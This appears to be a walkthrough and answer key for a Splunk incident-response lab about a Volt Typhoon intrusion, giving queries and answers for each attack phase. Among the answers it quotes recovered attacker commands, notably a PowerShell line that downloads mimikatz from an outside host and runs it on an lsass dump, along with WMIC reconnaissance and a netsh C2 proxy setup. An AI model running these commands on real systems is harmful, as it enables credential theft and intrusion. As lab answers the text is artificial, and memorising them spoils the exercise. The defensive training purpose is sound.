# Task 1 IR Scenario

## Volt Typhoon

Scenario: The SOC has detected suspicious activity indicative of an advanced persistent threat (APT) group known as Volt Typhoon, notorious for targeting high-value organizations. Assume the role of a security analyst and investigate the intrusion by retracing the attacker's steps.

You have been provided with various log types from a two-week time frame during which the suspected attack occurred. Your ability to research the suspected APT and understand how they maneuver through targeted networks will prove to be just as important as your Splunk skills. 

### No.1 I understand my duties and have started the attached virtual machine. 

#### Ans: No answer needed.

---

# Task 2 Initial Access 

## Initial Access

Volt Typhoon often gains initial access to target networks by exploiting vulnerabilities in enterprise software. In recent incidents, Volt Typhoon has been observed leveraging vulnerabilities in Zoho ManageEngine ADSelfService Plus, a popular self-service password management solution used by organizations.

### No. 2 Comb through the ADSelfService Plus logs to begin retracing the attacker’s steps. At what time (ISO 8601 format) was Dean's password changed and their account taken over by the attacker? 

#### Ans: 2024-03-24T11:10:22

Query Used: index=main sourcetype=adss action_name="Password Change" username="dean-admin" action_name="Password Change"

### No. 3 Shortly after Dean's account was compromised, the attacker created a new administrator account. What is the name of the new account that was created? 

#### Ans: Voltyp-admin

Query Used: index=main sourcetype=adss action_name="Security Question Setup" status=completed

Hint *Look shorty after the timestamp recorded for Dean’s password change.

---

# Task 3 Execution

## Execution

Volt Typhoon is known to exploit Windows Management Instrumentation Command-line (WMIC) for a range of execution techniques. They leverage WMIC for tasks such as gathering information and dumping valuable databases, allowing them to infiltrate and exploit target networks. By using "living off the land" binaries (LOLBins), they blend in with legitimate system activity, making detection more challenging.

### No. 4 In an information gathering attempt, what command does the attacker run to find information about local drives on server01 & server02? 

#### Ans: wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename

Query: index=main sourcetype=wmic username="dean-admin"
| table _time, ip_address, command

### No. 5 The attacker uses ntdsutil to create a copy of the AD database. After moving the file to a web server, the attacker compresses the database. What password does the attacker set on the archive? 

#### Ans: d5ag0nm@5t3r

Query: index=main sourcetype=wmic username="dean-admin"| rare limit=20 command

---

# Task 4 Persistence 

## Persistence

Our target APT frequently employs web shells as a persistence mechanism to maintain a foothold. They disguise these web shells as legitimate files, enabling remote control over the server and allowing them to execute commands undetected.

### No. 6 To establish persistence on the compromised server, the attacker created a web shell using base64 encoded text. In which directory was the web shell placed? 

#### Ans: C:\Windows\Temp\

Query: index=main sourcetype=wmic username="dean-admin" ip_address="192.168.1.153"

Hint *Look through the logs for the compromised server and command creating a webserver.

---

# Task 5 Defense Evasion

## Defense Evasion 

Volt Typhoon utilizes advanced defense evasion techniques to significantly reduce the risk of detection. These methods encompass regular file purging, eliminating logs, and conducting thorough reconnaissance of their operational environment.

### No. 7 In an attempt to begin covering their tracks, the attackers remove evidence of the compromise. They first start by wiping RDP records. What PowerShell cmdlet does the attacker use to remove the “Most Recently Used” record? 

#### Ans: Remove-itemProperty

Query: index=* sourcetype=powershell host=volthunter 
| table _time, CommandLine,
| sort -_time

### No. 8 The APT continues to cover their tracks by renaming and changing the extension of the previously created archive. What is the file name (with extension) created by the attackers? 

#### Ans:Cl64.gif

Query: index=* sourcetype=wmic username="dean-admin" 
| table _time, ip_address, command
| sort _time

Hint *Follow the timeline from the beginning when the attacker account was created.

### No. 9 Under what regedit path does the attacker check for evidence of a virtualized environment? 

#### Ans: "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control"

Query: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control

---

# Task 6 Credential Access

## Credential Access

Volt Typhoon often combs through target networks to uncover and extract credentials from a range of programs. Additionally, they are known to access hashed credentials directly from system memory.

### No. 10 Using reg query, Volt Typhoon hunts for opportunities to find useful credentials. What three pieces of software do they investigate? 

#### Ans: OpenSSH, putty, realvnc

Query: index=* sourcetype="powershell" "reg query"

### No. 11 What is the full decoded command the attacker uses to download and run mimikatz? 

#### Ans: Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait

---

# Task 7 Discovery & Lateral Movement

## Discovery

Volt Typhoon uses enumeration techniques to gather additional information about network architecture, logging mechanisms, successful logins, and software configurations, enhancing their understanding of the target environment for strategic purposes.

## Lateral Movement

The APT has been observed moving previously created web shells to different servers as part of their lateral movement strategy. This technique facilitates their ability to traverse through networks and maintain access across multiple systems.

### No. 12 The attacker uses wevtutil, a log retrieval tool, to enumerate Windows logs. What event IDs does the attacker search for? Answer Format: Increasing order separated by a space. 

#### Ans: 4624 4625 4769

### No. 13 Moving laterally to server-02, the attacker copies over the original web shell. What is the name of the new web shell that was created? 

#### Ans: Auditreport.jspx

Query: sourcetype=powershell CommandLine=Copy-item

---

# Task 8 Collection

## Collection

During the collection phase, Volt Typhoon extracts various types of data, such as local web browser information and valuable assets discovered within the target environment.

### No. 14 The attacker is able to locate some valuable financial information during the collection phase. What three files does Volt Typhoon make copies of using PowerShell? 

#### Ans: 2022.csv 2023.csv 2024.csv

Query: sourcetype=powershell CommandLine=Copy-item

---

# Task 9 C2 & Cleanup

## C2

Volt Typhoon utilizes publicly available tools as well as compromised devices to establish discreet command and control (C2) channels.

## Cleanup

To cover their tracks, the APT has been observed deleting event logs and selectively removing other traces and artifacts of their malicious activities.

### No. 15 The attacker uses netsh to create a proxy for C2 communications. What connect address and port does the attacker use when setting up the proxy? Answer Format: IP Port 

#### Ans: 10.2.30.1 8443

Query: index=* sourcetype=wmic "netsh"

### No. 16 To conceal their activities, what are the four types of event logs the attacker clears on the compromised system? 

#### Ans:Application Security Setup System

Query: sourcetype=powershell CommandLine=wevtutil

---

# References
- https://attack.mitre.org/techniques/T1070/007/

---

# Tools Used
- Splunk
- CyberChef
